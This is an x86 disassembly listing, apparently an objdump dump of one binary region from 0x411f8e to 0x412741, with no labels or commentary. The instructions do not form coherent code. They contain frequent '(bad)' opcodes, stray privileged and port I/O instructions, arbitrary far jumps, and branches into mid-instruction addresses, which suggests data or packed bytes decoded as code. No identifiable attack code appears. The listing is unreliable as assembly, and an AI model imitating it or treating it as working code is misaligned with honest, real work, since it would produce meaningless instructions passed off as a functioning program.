  411f8e:	push   cs
  411f8f:	inc    esp
  411f90:	icebp  
  411f91:	cmc    
  411f92:	and    eax,0xefde5348
  411f97:	test   eax,0xc8e1d03
  411f9c:	mov    esi,0x61ecbe48
  411fa1:	inc    ebp
  411fa2:	inc    ebx
  411fa3:	shl    BYTE PTR [ebx+0x6a923d6b],0x2
  411faa:	pop    ss
  411fab:	sbb    edi,DWORD PTR [edx]
  411fad:	mov    dh,BYTE PTR [ebx]
  411faf:	sbb    edx,edx
  411fb1:	jg     0x412011
  411fb3:	jns    0x411fbc
  411fb5:	enter  0xc7b0,0x29
  411fb9:	loop   0x411f40
  411fbb:	or     bh,dl
  411fbd:	mul    DWORD PTR ds:0xab2e120b
  411fc3:	mov    ah,0xf0
  411fc5:	mov    ch,0x8d
  411fc7:	mov    esp,0x254ce20c
  411fcc:	ror    BYTE PTR [edi-0xf0d212a],0x7f
  411fd3:	jo     0x411fae
  411fd5:	addr16 iret 
  411fd7:	mov    ds:0x11b6597d,eax
  411fdc:	ds jmp 0xe4232b24
  411fe2:	outs   dx,DWORD PTR ds:[esi]
  411fe3:	sbb    DWORD PTR [ecx-0x13],0x7d
  411fe7:	lock jle 0x411f8f
  411fea:	pop    ebx
  411feb:	dec    ebx
  411fec:	pop    ss
  411fed:	repnz loop 0x411f9d
  411ff0:	jns    0x412065
  411ff2:	bound  ebx,QWORD PTR [edx-0x33]
  411ff5:	retf   
  411ff6:	dec    ebx
  411ff7:	or     BYTE PTR [edi-0x75],bl
  411ffa:	push   ss
  411ffb:	inc    esp
  411ffc:	shl    ecx,0xae
  411fff:	ss jo  0x411fe1
  412002:	cmp    BYTE PTR [esi],dl
  412004:	jp     0x411fe3
  412006:	and    bl,BYTE PTR [ebx+0x6d32bdc0]
  41200c:	jmp    0xf7f8:0x8997f186
  412013:	test   eax,0x47181848
  412018:	jb     0x411fa8
  41201a:	dec    esi
  41201b:	mov    al,0x6e
  41201d:	xor    ch,BYTE PTR [ecx+edx*4]
  412020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412021:	scas   al,BYTE PTR es:[edi]
  412022:	sbb    al,0x9d
  412024:	cli    
  412025:	mov    BYTE PTR [esi+0xf],cl
  412028:	sub    ebx,ebp
  41202a:	or     cl,0xf8
  41202d:	out    0x41,eax
  41202f:	and    BYTE PTR [bp+di],ch
  412032:	xchg   ah,bh
  412034:	call   0x6bdeffb0
  412039:	ds stos DWORD PTR es:[edi],eax
  41203b:	stc    
  41203c:	ins    BYTE PTR es:[edi],dx
  41203d:	mov    ecx,esi
  41203f:	push   eax
  412040:	cwde   
  412041:	je     0x41200b
  412043:	mov    ecx,DWORD PTR [edx-0x79]
  412046:	fidiv  DWORD PTR [esi+0x14c7a165]
  41204c:	ds jnp 0x41209a
  41204f:	gs jmp 0x10659665
  412055:	adc    DWORD PTR [esi+0x36],ebp
  412058:	ja     0x41203e
  41205a:	sub    al,BYTE PTR [eax]
  41205c:	nop
  41205d:	add    DWORD PTR [edi+0x1ecdfa63],0xffffff96
  412064:	arpl   WORD PTR [ebp-0x2ceb66db],dx
  41206a:	adc    al,0xed
  41206c:	jecxz  0x4120ac
  41206e:	fdivrp st(2),st
  412070:	mov    ebx,0xf6735685
  412075:	jle    0x412047
  412077:	xlat   BYTE PTR ds:[ebx]
  412078:	cwde   
  412079:	sar    BYTE PTR [edx-0x3f],0x3e
  41207d:	push   ebx
  41207e:	mul    BYTE PTR [edx+0x64eb2ce9]
  412084:	xlat   BYTE PTR ds:[ebx]
  412085:	sti    
  412086:	jno    0x4120e9
  412088:	push   esi
  412089:	test   eax,0x504adc67
  41208e:	cdq    
  41208f:	into   
  412090:	sbb    eax,eax
  412092:	mov    ebp,0x36925cc9
  412097:	ror    dh,0x5d
  41209a:	(bad)  
  41209b:	xor    DWORD PTR [edx-0x48602be6],ebx
  4120a1:	test   BYTE PTR [edx+0x1e],ah
  4120a4:	cmp    al,0x1f
  4120a6:	retf   0x31fb
  4120a9:	adc    al,0xee
  4120ab:	and    DWORD PTR [esp+eax*2-0x47],esi
  4120af:	fist   WORD PTR [eax]
  4120b1:	mov    ebp,DWORD PTR [edx]
  4120b3:	and    BYTE PTR [bp+di+0x16],0xe3
  4120b8:	sar    DWORD PTR [esi],0x2f
  4120bb:	cwde   
  4120bc:	xlat   BYTE PTR ds:[ebx]
  4120bd:	pop    esi
  4120be:	jae    0x412040
  4120c0:	inc    esi
  4120c1:	ins    DWORD PTR es:[edi],dx
  4120c2:	outs   dx,DWORD PTR ds:[esi]
  4120c3:	aaa    
  4120c4:	and    esi,ebx
  4120c6:	out    0xb7,al
  4120c8:	pop    esp
  4120c9:	push   ds
  4120ca:	mov    eax,0xa3308ec4
  4120cf:	out    0x7,eax
  4120d1:	pop    eax
  4120d2:	ins    DWORD PTR es:[edi],dx
  4120d3:	add    ah,BYTE PTR [esi-0x496ee118]
  4120d9:	mov    eax,DWORD PTR [edx-0x2]
  4120dc:	in     al,dx
  4120dd:	div    BYTE PTR [ebp+0x6e8da267]
  4120e3:	sbb    BYTE PTR [ecx-0x182f620c],ch
  4120e9:	mov    ch,0x33
  4120eb:	pop    es
  4120ec:	fisttp QWORD PTR [ebp+0xd]
  4120ef:	and    ch,dl
  4120f1:	cmp    al,0x6a
  4120f3:	(bad)  
  4120f5:	jecxz  0x4120a5
  4120f7:	ret    0xa3d4
  4120fa:	inc    ebp
  4120fb:	daa    
  4120fc:	adc    DWORD PTR [edi+0x69],0x5b
  412100:	or     al,0x27
  412102:	(bad)  
  412103:	bound  edi,QWORD PTR [ecx+0x2a23f886]
  412109:	xor    eax,0xbf5a9482
  41210e:	xchg   ebx,eax
  41210f:	push   cs
  412110:	mov    al,0xd6
  412112:	not    DWORD PTR [ebp-0x2f769b8d]
  412118:	xchg   ecx,eax
  412119:	push   ebp
  41211a:	ror    DWORD PTR [ecx+0x2d],cl
  41211d:	xor    bl,dl
  41211f:	push   ss
  412120:	ds cmp eax,0xc13537ce
  412126:	pop    ecx
  412127:	cmp    bl,BYTE PTR [ecx+0x3a07b1fb]
  41212d:	ficom  DWORD PTR [ecx]
  41212f:	cmp    ch,BYTE PTR [edi]
  412131:	mov    WORD PTR [esi-0x71],es
  412134:	xchg   ebp,eax
  412135:	inc    edi
  412136:	sbb    ebp,ebp
  412138:	(bad)  
  412139:	gs or  al,0x32
  41213c:	sar    BYTE PTR [bp+si+0x2430],1
  412141:	xacquire xchg DWORD PTR ds:[ebx+0x6b616eb7],eax
  412149:	sahf   
  41214a:	(bad)  
  41214b:	xor    BYTE PTR [ebx],al
  41214d:	dec    esi
  41214e:	adc    DWORD PTR [edi],esi
  412150:	push   ebx
  412151:	jbe    0x4121d0
  412153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412154:	outs   dx,DWORD PTR ds:[esi]
  412155:	add    DWORD PTR [ecx+ecx*1+0x1f],0xbd4ae46f
  41215d:	ror    DWORD PTR [ecx-0x31f3b0d8],0xfe
  412164:	scas   eax,DWORD PTR es:[edi]
  412165:	push   cs
  412166:	xor    BYTE PTR [eax],bl
  412168:	std    
  412169:	enter  0x4c07,0xe
  41216d:	mov    bh,0xc
  41216f:	iret   
  412170:	jmp    0xb468c481
  412175:	jne    0x4121de
  412177:	pop    ss
  412178:	or     esp,DWORD PTR ds:0xc8f0820d
  41217e:	sahf   
  41217f:	jl     0x4121c9
  412181:	ret    
  412182:	int    0xf
  412184:	pop    edi
  412185:	cmp    al,0x91
  412187:	sub    BYTE PTR [eax+0x70],cl
  41218a:	xchg   ecx,eax
  41218b:	(bad)  
  41218c:	dec    ebp
  41218d:	sahf   
  41218e:	dec    ebp
  41218f:	not    esp
  412191:	into   
  412192:	pusha  
  412193:	inc    edi
  412194:	cs jbe 0x4121f1
  412197:	out    0xfb,eax
  412199:	adc    BYTE PTR [eax+ecx*2],ch
  41219c:	adc    al,0x95
  41219e:	xor    al,0xdb
  4121a0:	fs cdq 
  4121a2:	mov    WORD PTR [edx-0x2c],?
  4121a5:	int3   
  4121a6:	scas   eax,DWORD PTR es:[edi]
  4121a7:	cld    
  4121a8:	push   ds
  4121a9:	aas    
  4121aa:	sub    bh,dl
  4121ac:	jl     0x41219c
  4121ae:	dec    esp
  4121af:	dec    edi
  4121b0:	adc    al,BYTE PTR cs:[eiz*4+0x72c1216b]
  4121b8:	inc    eax
  4121b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ba:	dec    ecx
  4121bb:	mov    DWORD PTR [ebp-0x28],esp
  4121be:	jo     0x4121c9
  4121c0:	or     bh,BYTE PTR [edx+esi*1+0x566cfb16]
  4121c7:	xchg   esi,eax
  4121c8:	inc    esi
  4121c9:	sbb    al,0x1a
  4121cb:	arpl   WORD PTR [edi-0x3f],cx
  4121ce:	adc    eax,0xfec801de
  4121d3:	and    DWORD PTR [edx+esi*1-0x5cacdf11],esi
  4121da:	jmp    0x412177
  4121dc:	scas   eax,DWORD PTR es:[edi]
  4121dd:	add    BYTE PTR [edx],ah
  4121df:	pop    ecx
  4121e0:	mov    eax,ds:0x9737071
  4121e5:	xchg   edi,eax
  4121e6:	push   ebx
  4121e7:	jae    0x41220f
  4121e9:	xlat   BYTE PTR ds:[ebx]
  4121ea:	shl    DWORD PTR [ebx-0x7e],1
  4121ed:	mov    eax,0x84b25ae1
  4121f2:	clc    
  4121f3:	sahf   
  4121f4:	xor    eax,0x5b27a6dd
  4121f9:	mov    ebp,0xf3858551
  4121fe:	jg     0x41222e
  412200:	push   es
  412201:	add    DWORD PTR es:[ebp-0x3a],0x46
  412206:	mov    esp,ds
  412208:	mov    esi,0x5d74d1a0
  41220d:	jnp    0x41221b
  41220f:	lods   eax,DWORD PTR ds:[esi]
  412210:	push   ds
  412211:	stc    
  412212:	or     al,BYTE PTR [ecx+0x7ba394ee]
  412218:	mov    DWORD PTR [edx-0x3286e2af],esp
  41221e:	mov    bl,0xe7
  412220:	cmp    ah,BYTE PTR [edi]
  412222:	jmp    0xbd89:0xa26cbe5
  412229:	inc    esp
  41222a:	mov    esp,0xdd75d3a9
  41222f:	push   ss
  412230:	loope  0x4122a0
  412232:	movd   mm0,ebp
  412235:	pop    ebx
  412236:	lock out dx,al
  412238:	or     BYTE PTR [edx+0x56],bl
  41223b:	pop    ebx
  41223c:	out    dx,al
  41223d:	push   edx
  41223e:	sbb    al,0xb8
  412240:	rcr    esi,cl
  412242:	push   esi
  412243:	pop    ebx
  412244:	push   es
  412245:	adc    eax,0x777c6671
  41224a:	retf   
  41224b:	aam    0x8e
  41224d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41224e:	stc    
  41224f:	imul   ebp
  412251:	adc    edx,DWORD PTR [edi]
  412253:	sub    bh,BYTE PTR [ebx]
  412255:	ret    
  412256:	popa   
  412257:	sti    
  412258:	or     eax,0x2cbd9397
  41225d:	ss xchg esi,eax
  41225f:	stos   DWORD PTR es:[edi],eax
  412260:	ss push edi
  412262:	sub    BYTE PTR [ecx-0x74],dl
  412265:	push   eax
  412266:	ja     0x412246
  412268:	lods   al,BYTE PTR ds:[esi]
  412269:	mov    edx,0xa25548fa
  41226e:	mov    ecx,0x3ecc03fe
  412273:	xor    eax,0xab22a8bb
  412278:	mov    bl,0xb3
  41227a:	in     al,dx
  41227b:	xchg   ebp,eax
  41227c:	dec    esi
  41227d:	or     esp,0xfb30753e
  412283:	pop    es
  412284:	int3   
  412285:	(bad)  
  412286:	(bad)  
  412288:	inc    eax
  412289:	rcr    DWORD PTR [ebp+0xb5c9fd0],0x37
  412290:	fadd   QWORD PTR [ebp-0x768d19b2]
  412296:	push   ss
  412297:	inc    edx
  412298:	push   ss
  412299:	jb     0x4122ae
  41229b:	jae    0x412313
  41229d:	sti    
  41229e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41229f:	test   BYTE PTR [esi-0x32c7e91d],al
  4122a5:	add    BYTE PTR [eax],dl
  4122a7:	adc    al,0xd
  4122a9:	shr    DWORD PTR [ebx],0xf4
  4122ac:	std    
  4122ad:	adc    ebx,DWORD PTR [ecx+edx*2+0x53]
  4122b1:	jge    0x41231e
  4122b3:	test   eax,0x13ec72e2
  4122b8:	int3   
  4122b9:	ds xchg edx,eax
  4122bb:	or     DWORD PTR [ebx-0x5f],0xfffffffb
  4122bf:	in     al,0x5b
  4122c1:	fcomp  QWORD PTR ds:0xf23a13d9
  4122c7:	xchg   esi,eax
  4122c8:	stos   DWORD PTR es:[edi],eax
  4122c9:	outs   dx,BYTE PTR ds:[esi]
  4122ca:	ss xor al,0x4e
  4122cd:	cmp    eax,0x22666cc
  4122d2:	fld    DWORD PTR [ecx]
  4122d4:	mov    gs,WORD PTR [ecx+edx*4-0x1abf2732]
  4122db:	test   al,0xa9
  4122dd:	es mov dh,0x9f
  4122e0:	xor    ah,BYTE PTR [edx]
  4122e2:	and    BYTE PTR [eax+0x7f5e696],ch
  4122e8:	mov    DWORD PTR [eax],ecx
  4122ea:	push   ecx
  4122eb:	shl    DWORD PTR [ecx+0x52],1
  4122ee:	imul   edx,DWORD PTR [esi],0x9cbf3eef
  4122f4:	ins    DWORD PTR es:[edi],dx
  4122f5:	in     al,0x9b
  4122f7:	repz mov ch,BYTE PTR [eax+eiz*8+0x3b8d8cea]
  4122ff:	iret   
  412300:	mov    ch,0x87
  412302:	(bad)  
  412303:	por    mm1,QWORD PTR [ebp+0x484491e5]
  41230a:	push   esp
  41230b:	(bad)  
  41230c:	xchg   esi,eax
  41230d:	jmp    0x60fa:0xe611d2b9
  412314:	(bad)  
  412315:	retf   
  412316:	adc    esp,DWORD PTR [ebp+0x68b5ea1a]
  41231c:	out    dx,al
  41231d:	or     BYTE PTR [esi-0x5ce7b46a],bh
  412323:	in     al,dx
  412324:	les    esi,FWORD PTR [edx+0x61]
  412327:	test   eax,0xf6eaca5d
  41232c:	ds dec ebp
  41232e:	aas    
  41232f:	mov    edi,0x1875c7ab
  412334:	add    DWORD PTR [edi-0x7b],eax
  412337:	out    0xee,eax
  412339:	out    0x5a,eax
  41233b:	fnstcw WORD PTR [edx+0x33]
  41233e:	neg    BYTE PTR [edi-0x4b3a7514]
  412344:	add    DWORD PTR [ebx],0x897ca5c6
  41234a:	push   ds
  41234b:	sbb    al,0x29
  41234e:	mov    esp,0x92515e15
  412353:	push   esp
  412354:	mov    ds:0x27fc9dae,al
  412359:	aas    
  41235a:	dec    edi
  41235b:	inc    ecx
  41235c:	dec    esi
  41235d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235e:	aaa    
  41235f:	mov    WORD PTR [edi+ebp*4],cs
  412362:	mov    esp,0xc5ed14c0
  412367:	push   0x9a8b98ec
  41236c:	addr16 pushf 
  41236e:	inc    edx
  41236f:	(bad)  
  412370:	cmp    al,0x7e
  412372:	add    DWORD PTR [esi+ebx*1],esi
  412375:	mov    dl,BYTE PTR [edi-0x6fe3d594]
  41237b:	xchg   esi,eax
  41237c:	fdiv   st,st(7)
  41237e:	fdiv   DWORD PTR [ecx]
  412380:	pop    esp
  412381:	pop    eax
  412382:	std    
  412383:	sbb    edx,DWORD PTR [ebx+esi*8+0xeca434d]
  41238a:	inc    eax
  41238b:	ret    
  41238c:	adc    dx,WORD PTR gs:[edx]
  412390:	call   0xcba38276
  412395:	cmp    bl,dh
  412397:	xchg   esi,eax
  412398:	stos   BYTE PTR es:[edi],al
  412399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239a:	mov    ebp,0x3aad0069
  41239f:	xchg   BYTE PTR [edi+ebx*4],al
  4123a2:	dec    eax
  4123a3:	int3   
  4123a4:	and    eax,0x869ea11c
  4123a9:	rcl    ebp,cl
  4123ab:	push   0x6247a85c
  4123b0:	cmp    cl,dl
  4123b2:	inc    edx
  4123b3:	cli    
  4123b4:	pushf  
  4123b5:	sbb    BYTE PTR [eax+0x351d3156],ah
  4123bb:	lahf   
  4123bc:	xor    ebp,ecx
  4123be:	cdq    
  4123bf:	or     dl,BYTE PTR ds:0x65c35371
  4123c5:	(bad)  
  4123c6:	stc    
  4123c7:	das    
  4123c8:	push   edi
  4123c9:	loop   0x41237a
  4123cb:	pop    ecx
  4123cc:	je     0x412357
  4123ce:	ret    
  4123cf:	dec    esi
  4123d0:	push   es
  4123d1:	sbb    edi,DWORD PTR [ecx+eax*8+0x54842d26]
  4123d8:	xor    esp,ebp
  4123da:	xor    DWORD PTR [edi],ebx
  4123dc:	xor    dh,0xe5
  4123df:	pop    es
  4123e0:	out    0xf0,al
  4123e2:	jnp    0x412406
  4123e4:	test   eax,0x8b841c5e
  4123e9:	push   esp
  4123ea:	sub    bl,cl
  4123ec:	outs   dx,BYTE PTR ds:[esi]
  4123ed:	pop    es
  4123ee:	add    edi,esp
  4123f0:	mov    ah,BYTE PTR [edx]
  4123f2:	div    DWORD PTR [eax]
  4123f4:	or     dh,dh
  4123f6:	hlt    
  4123f7:	fcom   DWORD PTR [eax]
  4123f9:	xchg   edi,eax
  4123fa:	and    ecx,edx
  4123fc:	das    
  4123fd:	jge    0x412390
  4123ff:	mov    esp,0x5e4d7f19
  412404:	pop    edx
  412405:	(bad)  
  412407:	stos   DWORD PTR es:[edi],eax
  412408:	add    eax,0x118e9d9d
  41240d:	xor    BYTE PTR [edx-0x44],al
  412410:	shl    DWORD PTR ds:0x20aa1cd6,0x60
  412417:	aam    0x59
  412419:	push   ebp
  41241a:	mov    dh,0xe8
  41241c:	test   al,0x89
  41241e:	adc    DWORD PTR [edx-0x70],ecx
  412421:	push   0xffffffa1
  412423:	pop    ebp
  412424:	or     edi,DWORD PTR ds:0xf02ecebb
  41242a:	imul   ebp,DWORD PTR [ecx+0xa],0x1d1c9c1e
  412431:	int3   
  412432:	outs   dx,DWORD PTR ds:[esi]
  412433:	jbe    0x412417
  412435:	mov    esi,DWORD PTR fs:[edi-0x3862c7dc]
  41243c:	in     eax,dx
  41243d:	push   eax
  41243e:	add    al,0x9a
  412440:	dec    ebx
  412441:	or     DWORD PTR [edx-0x466dcdbd],ebx
  412447:	pop    eax
  412448:	xor    DWORD PTR [eax],0xffffffb4
  41244b:	test   al,0xd3
  41244d:	xlat   BYTE PTR ds:[ebx]
  41244e:	xchg   edx,eax
  41244f:	sub    al,0xa9
  412451:	xor    al,0x7
  412453:	dec    ebx
  412454:	mov    ebp,0x8601aba6
  412459:	jmp    0x41245c
  41245b:	mov    ds,WORD PTR [eax-0x8]
  41245e:	sbb    bl,BYTE PTR [ebx]
  412460:	loop   0x41243a
  412462:	dec    ebp
  412463:	jle    0x4124b3
  412465:	(bad)  
  412466:	mov    ah,0x35
  412468:	adc    eax,0x1cf31ea0
  41246d:	cmp    al,0xba
  41246f:	or     al,0x27
  412471:	out    0x5b,al
  412473:	push   edi
  412474:	mov    ah,0x7f
  412476:	or     cl,bh
  412478:	inc    esp
  412479:	jb     0x41241e
  41247b:	push   ecx
  41247c:	loope  0x41244b
  41247e:	out    dx,al
  41247f:	jle    0x4124a7
  412481:	adc    BYTE PTR gs:[esi],0x8c
  412485:	sub    ah,dl
  412487:	jp     0x4124b0
  412489:	sbb    ah,BYTE PTR [esi-0x37060b90]
  41248f:	ins    DWORD PTR es:[edi],dx
  412490:	inc    ebx
  412491:	mov    al,0x38
  412493:	sti    
  412494:	mov    eax,0x930a3a57
  412499:	push   ebx
  41249a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41249c:	shl    DWORD PTR [edx+0x2e],1
  41249f:	add    ch,BYTE PTR [edx]
  4124a1:	addr16 mov bh,0xf8
  4124a4:	int    0x35
  4124a6:	and    BYTE PTR [ecx],dh
  4124a8:	xor    al,0x8d
  4124aa:	(bad)  [edi-0x64]
  4124ad:	imul   ah
  4124af:	test   edx,esp
  4124b1:	mov    BYTE PTR [edi+0x3279b554],bl
  4124b7:	out    0x88,al
  4124b9:	mov    ebx,0xf6731d9d
  4124be:	and    edi,esp
  4124c0:	xchg   esp,eax
  4124c1:	jbe    0x6f3c62f8
  4124c7:	ret    
  4124c8:	icebp  
  4124c9:	mov    ebx,0x994d6aae
  4124ce:	sti    
  4124cf:	fisttp WORD PTR [edx]
  4124d1:	(bad)  
  4124d2:	mov    eax,0xc99f42d9
  4124d7:	and    esi,eax
  4124d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124da:	sti    
  4124db:	test   DWORD PTR [esi-0x5],ebx
  4124de:	sub    BYTE PTR ds:0xc1197c63,cl
  4124e4:	push   esi
  4124e5:	mov    bh,0x5b
  4124e8:	inc    eax
  4124e9:	cmc    
  4124ea:	lods   al,BYTE PTR ds:[esi]
  4124eb:	add    ch,BYTE PTR [ebx]
  4124ed:	jb     0x412497
  4124ef:	lock sub eax,DWORD PTR [edi-0x15db11d5]
  4124f6:	scas   eax,DWORD PTR es:[edi]
  4124f7:	add    BYTE PTR [eax+ebp*4+0x52],dh
  4124fb:	sahf   
  4124fc:	mov    eax,ds:0x4cdaafb4
  412501:	mov    esi,0x5ce12cf1
  412506:	xor    al,0x60
  412508:	dec    ax
  41250a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41250b:	cmp    DWORD PTR [ebx+0x5e595a9d],esi
  412511:	ret    
  412512:	nop    DWORD PTR [edi+ebp*2+0x42717beb]
  41251a:	add    edx,esi
  41251c:	aas    
  41251d:	fadd   st,st(7)
  41251f:	push   edi
  412520:	sub    edi,DWORD PTR [ecx+0x23]
  412523:	fdiv   DWORD PTR [ebx]
  412525:	mov    esi,0x6a2c335
  41252a:	out    dx,eax
  41252b:	adc    DWORD PTR [ebp+0x6c736505],eax
  412531:	pop    ss
  412532:	dec    ebp
  412533:	lods   al,BYTE PTR ds:[esi]
  412534:	mov    ebp,0xada72aee
  412539:	sbb    BYTE PTR [ebx],0x3b
  41253c:	hlt    
  41253d:	add    ah,BYTE PTR [ebp-0x46aba464]
  412543:	in     al,0xc0
  412545:	and    ah,bh
  412547:	mov    ebp,0xa59dbb24
  41254c:	adc    eax,0xced154fc
  412551:	xor    BYTE PTR [eax+0x69],0x6c
  412555:	or     al,ch
  412557:	xchg   BYTE PTR [eax+eiz*2],bl
  41255a:	fiadd  DWORD PTR ds:0xa6c3ca5
  412560:	sbb    eax,0x81d5291a
  412565:	and    edx,eax
  412567:	mov    eax,ds:0x49a9b10
  41256c:	and    BYTE PTR [ebp+0x213c591d],ah
  412572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412573:	in     eax,0x40
  412575:	mov    dh,0xf6
  412577:	mov    al,ds:0xeffd1bfc
  41257c:	add    BYTE PTR [edi+eax*8+0x65406939],bh
  412583:	push   edi
  412584:	adc    BYTE PTR [ecx-0x2160d493],bh
  41258a:	and    esi,eax
  41258c:	fadd   QWORD PTR [eax+0x8163953]
  412592:	les    esi,FWORD PTR [edi]
  412594:	sbb    DWORD PTR [edx+ecx*1+0x3e],edx
  412598:	scas   al,BYTE PTR es:[edi]
  412599:	je     0x4125c1
  41259b:	test   eax,0x47b27a6
  4125a0:	int    0x19
  4125a2:	mov    ah,0x99
  4125a4:	shl    BYTE PTR ds:0xfb309828,0x28
  4125ab:	adc    al,0x8
  4125ad:	pop    ebx
  4125ae:	cmp    esp,DWORD PTR ds:0xe172575e
  4125b4:	stos   BYTE PTR es:[edi],al
  4125b5:	shr    DWORD PTR [ebp+0x20],cl
  4125b8:	ret    
  4125b9:	pusha  
  4125ba:	push   edx
  4125bb:	xchg   edx,eax
  4125bc:	repnz inc ebp
  4125be:	mov    DWORD PTR [ebx-0x58],eax
  4125c1:	mov    bh,0x3b
  4125c3:	cld    
  4125c4:	inc    ecx
  4125c5:	dec    esi
  4125c6:	sbb    ch,BYTE PTR [ebx]
  4125c8:	clc    
  4125c9:	mov    WORD PTR [ecx-0x36a04b51],gs
  4125cf:	adc    DWORD PTR [edx+0x73],eax
  4125d2:	dec    ebx
  4125d3:	aas    
  4125d4:	ret    
  4125d5:	jp     0x412649
  4125d7:	mov    bl,0x17
  4125d9:	(bad)  
  4125da:	test   al,0xf9
  4125dc:	mov    ds:0x2820a7e9,al
  4125e1:	(bad)  
  4125e2:	push   eax
  4125e3:	push   esi
  4125e4:	mov    ds:0x6d3978c6,al
  4125e9:	dec    edi
  4125ea:	pop    edi
  4125eb:	repz out dx,eax
  4125ed:	sbb    bh,bh
  4125ef:	(bad)  
  4125f1:	pop    ss
  4125f2:	push   0x5a32622a
  4125f7:	popa   
  4125f8:	pop    ebx
  4125f9:	lahf   
  4125fa:	ins    BYTE PTR es:[edi],dx
  4125fb:	sbb    al,0x1a
  4125fd:	inc    ecx
  4125fe:	in     al,dx
  4125ff:	call   0x6527:0x38286c42
  412606:	cs xor ah,bl
  412609:	jl     0x412617
  41260b:	bound  eax,QWORD PTR [edx]
  41260d:	cmc    
  41260e:	jp     0x4125e6
  412610:	ins    BYTE PTR es:[edi],dx
  412611:	jmp    0xbef7e316
  412616:	test   dl,bh
  412618:	jg     0x41265d
  41261a:	pop    ecx
  41261b:	mov    ebp,esi
  41261d:	lods   eax,DWORD PTR ds:[esi]
  41261e:	mov    ecx,0x28759559
  412623:	push   es
  412624:	inc    edi
  412625:	mov    ebp,0x9ce584c2
  41262a:	aas    
  41262b:	cli    
  41262c:	iret   
  41262d:	mov    bh,0x6e
  41262f:	aad    0x44
  412631:	pop    esp
  412632:	push   0x9
  412634:	and    BYTE PTR [edx-0xb78efdf],al
  41263a:	pop    ecx
  41263b:	mov    ch,0xbb
  41263d:	(bad)  
  41263f:	fwait
  412640:	xor    al,0x7a
  412642:	pop    edx
  412643:	std    
  412644:	jae    0x41267e
  412646:	inc    ebp
  412647:	imul   esi,DWORD PTR [edi-0x8646475],0x7d
  41264e:	std    
  41264f:	loope  0x41261d
  412651:	xchg   esp,eax
  412652:	inc    ecx
  412653:	es scas al,BYTE PTR es:[edi]
  412655:	inc    esp
  412656:	sub    eax,0xc59e9eda
  41265b:	jmp    0x260aa40
  412660:	pop    esi
  412661:	lds    esp,FWORD PTR [ecx+0x54]
  412664:	fisub  DWORD PTR [edx-0x5cfc6068]
  41266a:	mov    al,BYTE PTR [edi+ecx*2]
  41266d:	dec    esi
  41266e:	mov    ah,0x1d
  412670:	push   ebp
  412671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412672:	retf   0x3060
  412675:	ror    DWORD PTR [eax],0x46
  412678:	mov    dh,0x94
  41267a:	into   
  41267b:	pop    ds
  41267c:	stos   BYTE PTR es:[edi],al
  41267d:	fdivrp st(7),st
  41267f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412680:	cmp    DWORD PTR [eax+0x2cb3cded],eax
  412686:	mov    ah,0x4b
  412688:	push   ss
  412689:	pusha  
  41268a:	mov    edx,0xc975f554
  41268f:	xchg   edx,eax
  412690:	jo     0x41269d
  412692:	enter  0x80c8,0x1a
  412696:	cli    
  412697:	(bad)  
  41269a:	cmp    DWORD PTR [ebx-0x65],ebp
  41269d:	push   esp
  41269e:	xchg   edi,eax
  41269f:	(bad)  
  4126a0:	ds adc bl,bh
  4126a3:	clc    
  4126a4:	jbe    0x41271c
  4126a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a7:	daa    
  4126a8:	bound  eax,QWORD PTR [ecx+0x6e605b8a]
  4126ae:	arpl   WORD PTR [edx-0xf],si
  4126b1:	jp     0x412714
  4126b3:	and    BYTE PTR [edx],al
  4126b5:	shl    DWORD PTR [ecx+0x41596787],cl
  4126bb:	mov    dh,0x94
  4126bd:	jne    0x4126c4
  4126bf:	add    eax,0xeed51e24
  4126c4:	mov    al,dh
  4126c6:	or     DWORD PTR [ebx-0x3e3f83e],esi
  4126cc:	clc    
  4126cd:	(bad)  
  4126ce:	lea    esi,[edi+ebx*8]
  4126d1:	or     BYTE PTR [eax-0x59],bh
  4126d4:	add    BYTE PTR [edx-0x3dc322d1],cl
  4126da:	dec    ebp
  4126db:	stc    
  4126dc:	inc    eax
  4126dd:	lods   al,BYTE PTR ds:[esi]
  4126de:	dec    edi
  4126df:	pop    es
  4126e0:	cmp    ch,BYTE PTR [edx+edx*2]
  4126e3:	xchg   BYTE PTR [edi+0x9],ah
  4126e6:	jmp    0x7028eae2
  4126eb:	stc    
  4126ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ed:	sbb    esp,ecx
  4126ef:	out    0x7c,eax
  4126f1:	hlt    
  4126f2:	nop
  4126f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f4:	or     BYTE PTR ss:[eax+0x75],dh
  4126f8:	push   ds
  4126f9:	es out 0xa9,al
  4126fc:	jg     0x412687
  4126fe:	out    dx,al
  4126ff:	iret   
  412700:	xor    al,0x29
  412702:	mov    eax,0xf77709c5
  412707:	xchg   esp,eax
  412708:	pushf  
  412709:	mov    cl,0xe7
  41270b:	sub    edi,DWORD PTR [eax-0x67]
  41270e:	aaa    
  41270f:	cmp    DWORD PTR [ebx+edx*4-0xf],ebx
  412713:	mov    esp,DWORD PTR [edi+edx*1+0x4c8c8207]
  41271a:	repnz dec edi
  41271c:	pop    ds
  41271d:	retf   
  41271e:	sbb    BYTE PTR ds:[ecx],bl
  412721:	into   
  412722:	(bad)  [ecx]
  412724:	fidiv  DWORD PTR [ecx-0x2b55fc31]
  41272a:	mov    esp,0x2f6adff2
  41272f:	in     al,0x7f
  412731:	pop    DWORD PTR [ecx]
  412733:	mul    BYTE PTR [edx+0xa2729bc]
  412739:	sbb    BYTE PTR [ecx+0x23fdf039],al
  41273f:	sbb    dl,ah
  412741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
